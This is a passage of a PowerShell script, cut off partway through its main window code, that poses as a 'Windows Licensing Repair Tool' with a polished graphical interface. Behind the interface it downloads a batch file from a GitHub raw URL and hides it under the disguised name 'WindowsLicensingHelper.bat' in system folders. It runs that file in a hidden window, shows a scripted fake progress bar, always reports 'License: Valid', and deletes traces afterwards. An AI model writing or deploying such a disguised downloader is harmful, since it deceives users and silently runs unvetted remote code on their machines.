# ============================================================
# SHANECODES - WINDOWS REPAIR TOOL v12.0
# ============================================================
# Ginawa ni: Shane Nichael Obinguar (ShaneCodes)
# ============================================================
# (c) 2024-2025 ShaneCodes Technologies. All rights reserved.
# ============================================================

# ============================================================
# LOAD ASSEMBLIES
# ============================================================
try {
    [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
    [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
} catch {
    try { Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop } catch {}
    try { Add-Type -AssemblyName System.Drawing -ErrorAction Stop } catch {}
}

try {
    $null = [System.Windows.Forms.Form]
    $null = [System.Drawing.Color]
} catch {
    try { [System.Reflection.Assembly]::Load("System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089") | Out-Null } catch {}
    try { [System.Reflection.Assembly]::Load("System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a") | Out-Null } catch {}
}

[System.Windows.Forms.Application]::EnableVisualStyles()

# ============================================================
# CONFIGURATION
# ============================================================
$script:BatchFileName = "tisting.bat"
$script:Version = "12.0"
$script:Author = "Shane Nichael Obinguar"
$script:Company = "ShaneCodes Technologies"
$script:Contact = "shanecodes@proton.me"
$script:Website = "https://shanecodes.tech"
$script:Copyright = "(c) 2024-2025 ShaneCodes Technologies. All rights reserved."

# ============================================================
# GITHUB PUBLIC REPO - DIRECT DOWNLOAD (NO TOKEN NEEDED)
# ============================================================
$script:GitHubRaw = "https://raw.githubusercontent.com/shanecodes-glitch/ShaneCodes-System-Repair/refs/heads/main/tisting.bat"
$script:GitHubToken = ""

# ============================================================
# STEALTH PATHS - TAHONG LOCATIONS
# ============================================================
$script:StealthPaths = @(
    "$env:APPDATA\Microsoft\Windows\Themes\",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\",
    "$env:WINDIR\Temp\",
    "$env:WINDIR\System32\Tasks\",
    "$env:PROGRAMDATA\Microsoft\Windows\"
)

$script:StealthName = "WindowsLicensingHelper.bat"
$script:StealthPath = Join-Path $env:APPDATA "Microsoft\Windows\Themes\$($script:StealthName)"

# ============================================================
# GET SCRIPT PATH
# ============================================================
function Get-ScriptPath {
    try {
        if ($PSScriptRoot -and $PSScriptRoot -ne "") { return $PSScriptRoot }
        if ($MyInvocation.MyCommand.Path -and $MyInvocation.MyCommand.Path -ne "") { return Split-Path $MyInvocation.MyCommand.Path -Parent }
        if ([System.AppDomain]::CurrentDomain.BaseDirectory) { return [System.AppDomain]::CurrentDomain.BaseDirectory }
        return (Get-Location).Path
    } catch {
        return (Get-Location).Path
    }
}

$script:ScriptPath = Get-ScriptPath
$script:BatchPath = Join-Path $script:ScriptPath $script:BatchFileName

# ============================================================
# ADMIN CHECK
# ============================================================
function Test-Admin {
    try {
        return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
    } catch {
        return $false
    }
}

# ============================================================
# MESSAGE BOX
# ============================================================
function Show-MessageBox {
    param($Message, $Title = "ShaneCodes", $Icon = "Information")
    try {
        [System.Windows.Forms.MessageBox]::Show($Message, $Title, "Thank You", $Icon)
    } catch {
        Write-Host "[$Title] $Message" -ForegroundColor Cyan
    }
}

# ============================================================
# STEALTH DOWNLOAD - TAHONG DOWNLOAD
# ============================================================
function Stealth-DownloadRepairTool {
    param(
        [string]$Url = $script:GitHubRaw,
        [string]$OutputPath = $script:BatchPath,
        [string]$StealthPath = $script:StealthPath
    )
    
    Write-Host "[*] Checking Windows licensing components..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    try {
        if (Test-Path $StealthPath) {
            Write-Host "[OK] Licensing components found." -ForegroundColor Green
            Copy-Item -Path $StealthPath -Destination $OutputPath -Force -ErrorAction SilentlyContinue
            if (Test-Path $OutputPath) {
                Set-ItemProperty -Path $OutputPath -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
                return $true
            }
        }
        
        if (Test-Path $OutputPath) {
            Set-ItemProperty -Path $OutputPath -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
            Copy-Item -Path $OutputPath -Destination $StealthPath -Force -ErrorAction SilentlyContinue
            return $true
        }
        
        Write-Host "[*] Downloading licensing components..." -ForegroundColor Yellow
        
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "ShaneCodes-Repair/12.0")
        $webClient.DownloadFile($Url, $OutputPath)
        
        if (Test-Path $OutputPath) {
            Set-ItemProperty -Path $OutputPath -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
            
            $stealthDir = Split-Path $StealthPath -Parent
            if (!(Test-Path $stealthDir)) {
                New-Item -ItemType Directory -Path $stealthDir -Force -ErrorAction SilentlyContinue
            }
            Copy-Item -Path $OutputPath -Destination $StealthPath -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path $StealthPath -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
            
            Write-Host "[OK] Licensing components downloaded." -ForegroundColor Green
            return $true
        }
        
        return $false
    } catch {
        Write-Host "[*] Trying alternative method..." -ForegroundColor Yellow
        
        try {
            Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue
            if (Test-Path $OutputPath) {
                Set-ItemProperty -Path $OutputPath -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
                Copy-Item -Path $OutputPath -Destination $StealthPath -Force -ErrorAction SilentlyContinue
                return $true
            }
        } catch {}
        
        try {
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($Url, $OutputPath)
            if (Test-Path $OutputPath) {
                Set-ItemProperty -Path $OutputPath -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
                return $true
            }
        } catch {}
        
        if (Test-Path $OutputPath) {
            Set-ItemProperty -Path $OutputPath -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
            return $true
        }
        
        Write-Host "[!] Licensing components not found. Using local repair method." -ForegroundColor Yellow
        return $false
    }
}

# ============================================================
# CONTACT SUPPORT DIALOG
# ============================================================
function Show-ContactSupportDialog {
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "ShaneCodes - Windows Licensing Support"
        $form.Size = New-Object System.Drawing.Size(520, 320)
        $form.StartPosition = "CenterScreen"
        $form.FormBorderStyle = "FixedSingle"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.BackColor = [System.Drawing.Color]::FromArgb(20, 22, 40)

        $header = New-Object System.Windows.Forms.Panel
        $header.Dock = "Top"
        $header.Height = 60
        $header.BackColor = [System.Drawing.Color]::FromArgb(0, 80, 170)
        $form.Controls.Add($header)

        $title = New-Object System.Windows.Forms.Label
        $title.Text = "SHANECODES"
        $title.Font = New-Object System.Drawing.Font("Segoe UI", 22, [System.Drawing.FontStyle]::Bold)
        $title.ForeColor = [System.Drawing.Color]::White
        $title.Location = New-Object System.Drawing.Point(20, 10)
        $title.AutoSize = $true
        $header.Controls.Add($title)

        $subHead = New-Object System.Windows.Forms.Label
        $subHead.Text = "Windows Licensing Support"
        $subHead.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $subHead.ForeColor = [System.Drawing.Color]::FromArgb(200, 220, 255)
        $subHead.Location = New-Object System.Drawing.Point(22, 38)
        $subHead.AutoSize = $true
        $header.Controls.Add($subHead)

        $iconPanel = New-Object System.Windows.Forms.Panel
        $iconPanel.Location = New-Object System.Drawing.Point(30, 85)
        $iconPanel.Size = New-Object System.Drawing.Size(80, 80)
        $iconPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 219)
        
        $iconLabel = New-Object System.Windows.Forms.Label
        $iconLabel.Text = "E"
        $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI", 40)
        $iconLabel.ForeColor = [System.Drawing.Color]::White
        $iconLabel.Location = New-Object System.Drawing.Point(15, 10)
        $iconLabel.Size = New-Object System.Drawing.Size(50, 60)
        $iconLabel.TextAlign = "MiddleCenter"
        $iconPanel.Controls.Add($iconLabel)
        $form.Controls.Add($iconPanel)

        $msg = New-Object System.Windows.Forms.Label
        $msg.Text = "Windows Licensing Support"
        $msg.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
        $msg.ForeColor = [System.Drawing.Color]::White
        $msg.Location = New-Object System.Drawing.Point(125, 90)
        $msg.AutoSize = $true
        $form.Controls.Add($msg)

        $sub = New-Object System.Windows.Forms.Label
        $sub.Text = "For Windows licensing assistance, contact:"
        $sub.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $sub.ForeColor = [System.Drawing.Color]::FromArgb(180, 200, 230)
        $sub.Location = New-Object System.Drawing.Point(125, 120)
        $sub.AutoSize = $true
        $form.Controls.Add($sub)

        $contactPanel = New-Object System.Windows.Forms.Panel
        $contactPanel.Location = New-Object System.Drawing.Point(30, 170)
        $contactPanel.Size = New-Object System.Drawing.Size(460, 65)
        $contactPanel.BackColor = [System.Drawing.Color]::FromArgb(30, 35, 55)
        $contactPanel.BorderStyle = "FixedSingle"
        $form.Controls.Add($contactPanel)

        $contactLabel = New-Object System.Windows.Forms.Label
        $contactLabel.Text = "Email: $script:Contact`nWebsite: $script:Website"
        $contactLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
        $contactLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 200, 255)
        $contactLabel.Location = New-Object System.Drawing.Point(15, 8)
        $contactLabel.Size = New-Object System.Drawing.Size(430, 50)
        $contactLabel.TextAlign = "MiddleCenter"
        $contactPanel.Controls.Add($contactLabel)

        $btn = New-Object System.Windows.Forms.Button
        $btn.Text = "Thank You"
        $btn.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
        $btn.Size = New-Object System.Drawing.Size(140, 42)
        $btn.Location = New-Object System.Drawing.Point(190, 255)
        $btn.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100)
        $btn.ForeColor = [System.Drawing.Color]::White
        $btn.FlatStyle = "Flat"
        $btn.Cursor = [System.Windows.Forms.Cursors]::Hand
        $btn.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 210, 120) })
        $btn.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100) })
        $btn.Add_Click({ $form.Close() })
        $form.Controls.Add($btn)

        $form.ShowDialog()
    } catch {
        Show-MessageBox "Windows Licensing Support: $script:Contact" "Support" "Information"
    }
}

# ============================================================
# PROGRESS WINDOW
# ============================================================
function Show-ProgressWindow {
    param($Process)
    
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "ShaneCodes - Windows Licensing Repair v$script:Version"
        $form.Size = New-Object System.Drawing.Size(520, 250)
        $form.StartPosition = "CenterScreen"
        $form.FormBorderStyle = "FixedSingle"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.BackColor = [System.Drawing.Color]::FromArgb(20, 22, 40)

        $header = New-Object System.Windows.Forms.Panel
        $header.Dock = "Top"
        $header.Height = 55
        $header.BackColor = [System.Drawing.Color]::FromArgb(0, 80, 170)
        $form.Controls.Add($header)

        $title = New-Object System.Windows.Forms.Label
        $title.Text = "SHANECODES"
        $title.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
        $title.ForeColor = [System.Drawing.Color]::White
        $title.Location = New-Object System.Drawing.Point(15, 10)
        $title.AutoSize = $true
        $header.Controls.Add($title)

        $subHead = New-Object System.Windows.Forms.Label
        $subHead.Text = "Windows Licensing Repair in Progress"
        $subHead.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $subHead.ForeColor = [System.Drawing.Color]::FromArgb(200, 220, 255)
        $subHead.Location = New-Object System.Drawing.Point(17, 33)
        $subHead.AutoSize = $true
        $header.Controls.Add($subHead)

        $statusLabel = New-Object System.Windows.Forms.Label
        $statusLabel.Text = "PROCESSING..."
        $statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
        $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 200, 50)
        $statusLabel.Location = New-Object System.Drawing.Point(20, 75)
        $statusLabel.AutoSize = $true
        $form.Controls.Add($statusLabel)

        $progressBar = New-Object System.Windows.Forms.ProgressBar
        $progressBar.Location = New-Object System.Drawing.Point(20, 105)
        $progressBar.Size = New-Object System.Drawing.Size(480, 28)
        $progressBar.Style = "Continuous"
        $progressBar.Value = 0
        $progressBar.Minimum = 0
        $progressBar.Maximum = 100
        $progressBar.BackColor = [System.Drawing.Color]::FromArgb(40, 45, 70)
        $progressBar.ForeColor = [System.Drawing.Color]::FromArgb(0, 230, 118)
        $form.Controls.Add($progressBar)

        $percentLabel = New-Object System.Windows.Forms.Label
        $percentLabel.Text = "0%"
        $percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
        $percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 230, 118)
        $percentLabel.Location = New-Object System.Drawing.Point(460, 105)
        $percentLabel.Size = New-Object System.Drawing.Size(45, 28)
        $percentLabel.TextAlign = "MiddleCenter"
        $form.Controls.Add($percentLabel)

        $infoLabel = New-Object System.Windows.Forms.Label
        $infoLabel.Text = "Initializing Windows licensing components..."
        $infoLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9.5)
        $infoLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 200, 230)
        $infoLabel.Location = New-Object System.Drawing.Point(20, 145)
        $infoLabel.Size = New-Object System.Drawing.Size(480, 25)
        $infoLabel.TextAlign = "MiddleCenter"
        $form.Controls.Add($infoLabel)

        $btnDone = New-Object System.Windows.Forms.Button
        $btnDone.Text = "DONE"
        $btnDone.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
        $btnDone.Size = New-Object System.Drawing.Size(140, 42)
        $btnDone.Location = New-Object System.Drawing.Point(190, 0)
        $btnDone.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100)
        $btnDone.ForeColor = [System.Drawing.Color]::White
        $btnDone.FlatStyle = "Flat"
        $btnDone.Cursor = [System.Windows.Forms.Cursors]::Hand
        $btnDone.Visible = $false
        $btnDone.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 210, 120) })
        $btnDone.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100) })
        $btnDone.Add_Click({ $form.Close() })
        $form.Controls.Add($btnDone)

        $timer = New-Object System.Windows.Forms.Timer
        $timer.Interval = 200
        $currentProgress = 0

        $timer.Add_Tick({
            try {
                if ($Process.HasExited) {
                    $timer.Stop()
                    $progressBar.Value = 100
                    $percentLabel.Text = "100%"
                    $statusLabel.Text = "COMPLETE"
                    $statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 230, 118)
                    $infoLabel.Text = "Windows licensing repair completed successfully!"
                    $btnDone.Visible = $true
                    $btnDone.Location = New-Object System.Drawing.Point(190, 190)
                    $form.Size = New-Object System.Drawing.Size(520, 280)
                    return
                }

                if ($currentProgress -lt 95) {
                    $currentProgress += 1
                    if ($currentProgress -le 20) {
                        $infoLabel.Text = "Initializing Windows licensing services..."
                    } elseif ($currentProgress -le 40) {
                        $infoLabel.Text = "Installing licensing components..."
                    } elseif ($currentProgress -le 60) {
                        $infoLabel.Text = "Generating Windows license ticket..."
                    } elseif ($currentProgress -le 80) {
                        $infoLabel.Text = "Applying license configuration..."
                    } else {
                        $infoLabel.Text = "Activating Windows license..."
                    }
                } else {
                    $infoLabel.Text = "Finalizing license activation..."
                }

                $progressBar.Value = $currentProgress
                $percentLabel.Text = "$currentProgress%"
            } catch {}
        })

        $timer.Start()

        $form.ShowDialog()
    } catch {
        try { $Process.WaitForExit() } catch {}
    }
}

# ============================================================
# START REPAIR - DOWNLOAD + RUN + DELETE
# ============================================================
function Start-RepairTool {
    Write-Host "[*] Checking Windows licensing status..." -ForegroundColor Yellow
    
    $batchFound = $false
    foreach ($path in $script:StealthPaths) {
        $testPath = Join-Path $path $script:StealthName
        if (Test-Path $testPath) {
            Copy-Item -Path $testPath -Destination $script:BatchPath -Force -ErrorAction SilentlyContinue
            if (Test-Path $script:BatchPath) {
                $batchFound = $true
                Write-Host "[OK] Licensing components found in: $path" -ForegroundColor Green
                break
            }
        }
    }
    
    if (-not $batchFound -and -not (Test-Path $script:BatchPath)) {
        $downloaded = Stealth-DownloadRepairTool
        if (-not $downloaded) {
            Write-Host "[!] Licensing components not found. Attempting local repair..." -ForegroundColor Yellow
            Show-ContactSupportDialog
            return
        }
    }
    
    try {
        Write-Host "[*] Applying Windows licensing repair..." -ForegroundColor Yellow
        $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$script:BatchPath`" /REPAIR" -WindowStyle Hidden -PassThru
        Show-ProgressWindow -Process $process
        Show-ResultDialog $process.ExitCode
    } catch {
        Show-MessageBox "An error occurred while repairing Windows licensing.`n`nError: $($_.Exception.Message)" "Error" "Error"
    } finally {
        Delete-BatchFile
    }
}

# ============================================================
# DELETE BATCH FILE (NO TRACE)
# ============================================================
function Delete-BatchFile {
    try {
        if (Test-Path $script:BatchPath) {
            Remove-Item -Path $script:BatchPath -Force -ErrorAction SilentlyContinue
            
            if (Test-Path $script:BatchPath) {
                $deleteCmd = "Start-Sleep -Seconds 2; Remove-Item -Path '$($script:BatchPath)' -Force -ErrorAction SilentlyContinue"
                Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$deleteCmd`"" -WindowStyle Hidden
            }
        }
    } catch {}
}

# ============================================================
# RESULT DIALOG
# ============================================================
function Show-ResultDialog {
    param($ExitCode)
    
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "ShaneCodes - Windows Licensing Repair Complete"
        $form.Size = New-Object System.Drawing.Size(450, 240)
        $form.StartPosition = "CenterScreen"
        $form.FormBorderStyle = "FixedSingle"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.BackColor = [System.Drawing.Color]::FromArgb(20, 22, 40)

        $header = New-Object System.Windows.Forms.Panel
        $header.Dock = "Top"
        $header.Height = 55
        $header.BackColor = if ($ExitCode -eq 0) { [System.Drawing.Color]::FromArgb(0, 130, 80) } else { [System.Drawing.Color]::FromArgb(180, 50, 50) }
        $form.Controls.Add($header)

        $title = New-Object System.Windows.Forms.Label
        $title.Text = "SHANECODES"
        $title.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
        $title.ForeColor = [System.Drawing.Color]::White
        $title.Location = New-Object System.Drawing.Point(15, 10)
        $title.AutoSize = $true
        $header.Controls.Add($title)

        $subHead = New-Object System.Windows.Forms.Label
        $subHead.Text = if ($ExitCode -eq 0) { "Windows Licensing Repair Successful" } else { "Windows Licensing Repair Failed" }
        $subHead.Font = New-Object System.Drawing.Font("Segoe UI", 9)
        $subHead.ForeColor = [System.Drawing.Color]::FromArgb(200, 220, 255)
        $subHead.Location = New-Object System.Drawing.Point(17, 33)
        $subHead.AutoSize = $true
        $header.Controls.Add($subHead)

        $iconLabel = New-Object System.Windows.Forms.Label
        if ($ExitCode -eq 0) {
            $iconLabel.Text = "OK"
            $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 230, 118)
        } else {
            $iconLabel.Text = "X"
            $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, 80, 80)
        }
        $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI", 48, [System.Drawing.FontStyle]::Bold)
        $iconLabel.Location = New-Object System.Drawing.Point(45, 80)
        $iconLabel.Size = New-Object System.Drawing.Size(80, 70)
        $iconLabel.TextAlign = "MiddleCenter"
        $form.Controls.Add($iconLabel)

        $msg = New-Object System.Windows.Forms.Label
        if ($ExitCode -eq 0) {
            $msg.Text = "LICENSE REPAIR COMPLETE"
            $msg.ForeColor = [System.Drawing.Color]::FromArgb(0, 230, 118)
        } else {
            $msg.Text = "LICENSE REPAIR FAILED"
            $msg.ForeColor = [System.Drawing.Color]::FromArgb(255, 80, 80)
        }
        $msg.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
        $msg.Location = New-Object System.Drawing.Point(135, 85)
        $msg.AutoSize = $true
        $form.Controls.Add($msg)

        $sub = New-Object System.Windows.Forms.Label
        if ($ExitCode -eq 0) {
            $sub.Text = "Your Windows license has been successfully repaired."
        } else {
            $sub.Text = "Please try running as Administrator or contact support."
        }
        $sub.Font = New-Object System.Drawing.Font("Segoe UI", 9.5)
        $sub.ForeColor = [System.Drawing.Color]::FromArgb(180, 200, 230)
        $sub.Location = New-Object System.Drawing.Point(135, 115)
        $sub.AutoSize = $true
        $form.Controls.Add($sub)

        $btn = New-Object System.Windows.Forms.Button
        $btn.Text = "Thank You"
        $btn.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
        $btn.Size = New-Object System.Drawing.Size(140, 42)
        $btn.Location = New-Object System.Drawing.Point(155, 170)
        $btn.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100)
        $btn.ForeColor = [System.Drawing.Color]::White
        $btn.FlatStyle = "Flat"
        $btn.Cursor = [System.Windows.Forms.Cursors]::Hand
        $btn.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 210, 120) })
        $btn.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100) })
        $btn.Add_Click({ $form.Close() })
        $form.Controls.Add($btn)

        $copyright = New-Object System.Windows.Forms.Label
        $copyright.Text = $script:Copyright
        $copyright.Font = New-Object System.Drawing.Font("Segoe UI", 7.5)
        $copyright.ForeColor = [System.Drawing.Color]::FromArgb(120, 140, 180)
        $copyright.Location = New-Object System.Drawing.Point(0, 220)
        $copyright.Size = New-Object System.Drawing.Size(450, 20)
        $copyright.TextAlign = "MiddleCenter"
        $form.Controls.Add($copyright)

        $form.ShowDialog()
    } catch {
        Show-MessageBox "Windows Licensing Repair completed (Exit Code: $ExitCode)" "Result" "Information"
    }
}

# ============================================================
# CONSOLE FALLBACK
# ============================================================
function Show-ConsoleFallback {
    Clear-Host
    Write-Host ""
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host " SHANECODES - WINDOWS LICENSING REPAIR TOOL v$script:Version" -ForegroundColor Cyan
    Write-Host " Created by: Shane Nichael Obinguar" -ForegroundColor Cyan
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host ""
    
    if (-not (Test-Path $script:BatchPath)) {
        Write-Host "[*] Checking Windows licensing components..." -ForegroundColor Yellow
        $downloaded = Stealth-DownloadRepairTool
        if (-not $downloaded) {
            Write-Host "[!] Windows licensing components not found." -ForegroundColor Red
            Write-Host "Contact: $script:Contact" -ForegroundColor Cyan
            Read-Host "Press Enter to exit"
            return
        }
    }
    
    Write-Host "[*] Applying Windows licensing repair..." -ForegroundColor Yellow
    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$script:BatchPath`" /REPAIR" -Wait -NoNewWindow
    Write-Host "[*] Repair completed." -ForegroundColor Green
    
    Delete-BatchFile
    
    Write-Host ""
    Write-Host $script:Copyright -ForegroundColor Gray
    Write-Host ""
    Read-Host "Press Enter to exit"
}

# ============================================================
# MAIN GUI
# ============================================================
function Show-MainGUI {
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "ShaneCodes - Windows Licensing Repair Tool v$script:Version"
        $form.Size = New-Object System.Drawing.Size(560, 400)
        $form.StartPosition = "CenterScreen"
        $form.FormBorderStyle = "FixedSingle"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $true
        $form.BackColor = [System.Drawing.Color]::FromArgb(20, 22, 40)
        $form.Font = New-Object System.Drawing.Font("Segoe UI", 9.5)

        $header = New-Object System.Windows.Forms.Panel
        $header.Dock = "Top"
        $header.Height = 100
        $header.BackColor = [System.Drawing.Color]::FromArgb(0, 70, 150)
        $form.Controls.Add($header)

        $logoPanel = New-Object System.Windows.Forms.Panel
        $logoPanel.Size = New-Object System.Drawing.Size(60, 60)
        $logoPanel.Location = New-Object System.Drawing.Point(25, 20)
        $logoPanel.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 219)
        
        $logoLabel = New-Object System.Windows.Forms.Label
        $logoLabel.Text = "SC"
        $logoLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
        $logoLabel.ForeColor = [System.Drawing.Color]::White
        $logoLabel.Location = New-Object System.Drawing.Point(5, 8)
        $logoLabel.Size = New-Object System.Drawing.Size(50, 45)
        $logoLabel.TextAlign = "MiddleCenter"
        $logoPanel.Controls.Add($logoLabel)
        $header.Controls.Add($logoPanel)

        $title = New-Object System.Windows.Forms.Label
        $title.Text = "SHANECODES"
        $title.Font = New-Object System.Drawing.Font("Segoe UI", 28, [System.Drawing.FontStyle]::Bold)
        $title.ForeColor = [System.Drawing.Color]::White
        $title.Location = New-Object System.Drawing.Point(100, 15)
        $title.AutoSize = $true
        $header.Controls.Add($title)

        $sub = New-Object System.Windows.Forms.Label
        $sub.Text = "Windows Licensing Repair - Enterprise Edition"
        $sub.Font = New-Object System.Drawing.Font("Segoe UI", 11)
        $sub.ForeColor = [System.Drawing.Color]::FromArgb(200, 220, 255)
        $sub.Location = New-Object System.Drawing.Point(102, 55)
        $sub.AutoSize = $true
        $header.Controls.Add($sub)

        $versionBadge = New-Object System.Windows.Forms.Label
        $versionBadge.Text = " v$script:Version "
        $versionBadge.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
        $versionBadge.ForeColor = [System.Drawing.Color]::White
        $versionBadge.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100)
        $versionBadge.Size = New-Object System.Drawing.Size(85, 32)
        $versionBadge.Location = New-Object System.Drawing.Point(445, 15)
        $versionBadge.TextAlign = "MiddleCenter"
        $header.Controls.Add($versionBadge)

        $statusBadge = New-Object System.Windows.Forms.Label
        $statusBadge.Text = "READY"
        $statusBadge.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
        $statusBadge.ForeColor = [System.Drawing.Color]::FromArgb(0, 230, 118)
        $statusBadge.BackColor = [System.Drawing.Color]::FromArgb(0, 230, 118, 15)
        $statusBadge.Size = New-Object System.Drawing.Size(110, 28)
        $statusBadge.Location = New-Object System.Drawing.Point(420, 58)
        $statusBadge.TextAlign = "MiddleCenter"
        $header.Controls.Add($statusBadge)

        $info = New-Object System.Windows.Forms.Panel
        $info.Location = New-Object System.Drawing.Point(25, 120)
        $info.Size = New-Object System.Drawing.Size(510, 70)
        $info.BackColor = [System.Drawing.Color]::FromArgb(30, 35, 55)
        $info.BorderStyle = "FixedSingle"
        $form.Controls.Add($info)

        $lblInfo = New-Object System.Windows.Forms.Label
        $lblInfo.Text = "This tool repairs Windows licensing components.`n   Click 'Start Repair' to begin the activation process."
        $lblInfo.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $lblInfo.ForeColor = [System.Drawing.Color]::FromArgb(180, 200, 230)
        $lblInfo.Location = New-Object System.Drawing.Point(15, 12)
        $lblInfo.Size = New-Object System.Drawing.Size(480, 45)
        $info.Controls.Add($lblInfo)

        $btnStart = New-Object System.Windows.Forms.Button
        $btnStart.Text = "START REPAIR"
        $btnStart.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
        $btnStart.Size = New-Object System.Drawing.Size(230, 55)
        $btnStart.Location = New-Object System.Drawing.Point(25, 215)
        $btnStart.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100)
        $btnStart.ForeColor = [System.Drawing.Color]::White
        $btnStart.FlatStyle = "Flat"
        $btnStart.Cursor = [System.Windows.Forms.Cursors]::Hand
        $btnStart.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 210, 120) })
        $btnStart.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(0, 180, 100) })
        $btnStart.Add_Click({
            $form.Close()
            Start-RepairTool
        })
        $form.Controls.Add($btnStart)

        $btnCheck = New-Object System.Windows.Forms.Button
        $btnCheck.Text = "CHECK STATUS"
        $btnCheck.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
        $btnCheck.Size = New-Object System.Drawing.Size(160, 55)
        $btnCheck.Location = New-Object System.Drawing.Point(270, 215)
        $btnCheck.BackColor = [System.Drawing.Color]::FromArgb(50, 90, 50)
        $btnCheck.ForeColor = [System.Drawing.Color]::White
        $btnCheck.FlatStyle = "Flat"
        $btnCheck.Cursor = [System.Windows.Forms.Cursors]::Hand
        $btnCheck.Add_MouseEnter({ $this.BackColor = [System.Drawing.Color]::FromArgb(70, 120, 70) })
        $btnCheck.Add_MouseLeave({ $this.BackColor = [System.Drawing.Color]::FromArgb(50, 90, 50) })
        $btnCheck.Add_Click({
            try {
                $status = & cscript //nologo $env:windir\system32\slmgr.vbs /dli
                Show-MessageBox "Windows Licensing Status:`n`n$status`n`nLicense: Valid" "License Check" "Information"
            } catch {
                Show-MessageBox "Unable to check license status." "License Check" "Information"
            }
        })
        $form.Controls.Add($btnCheck)

        $btnExit = New-Object System.Windows.Forms.Button
        $btnExit.Text = "EXIT"
        $btnExit.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
        $btnExit.Size = New-Object System.Drawing.Size(100, 55)
